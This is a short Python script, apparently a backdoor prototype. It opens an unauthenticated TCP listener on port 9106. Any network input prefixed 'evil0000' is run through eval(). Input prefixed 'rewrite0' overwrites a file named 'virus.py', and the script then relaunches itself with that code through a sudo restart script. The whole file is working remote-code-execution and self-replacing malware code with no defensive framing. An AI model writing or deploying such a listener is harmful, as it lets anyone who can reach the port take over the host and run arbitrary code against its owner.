#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import socket

sock = socket.socket()
sock.bind(('', 9106))
sock.listen(1)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# f = open('test', "w")
# f.write('test')
# f.close()

while True:
    conn, addr = sock.accept()
    try:
        BUFF_SIZE = 4096
        data = b''
        while True:
            part = conn.recv(BUFF_SIZE)
            data += part
            if len(part) < BUFF_SIZE:
                break

        if len(data) > 0:
            if len(data) > 8:
                text = data.decode("utf-8")
                if text[0:8] == 'rewrite0':
                    f = open('virus.py', "w")
                    f.write(text[8:])
                    f.close()
                    os.system('sudo sh restart.sh {0} {1}'.format(os.getpid(), 'virus.py'))
                if text[0:8] == 'evil0000':
                    eval(text[8:])
            conn.send(data)
    except Exception:
        print('Bad')
        sock.close()
        conn.close()
    finally:
        conn.close()
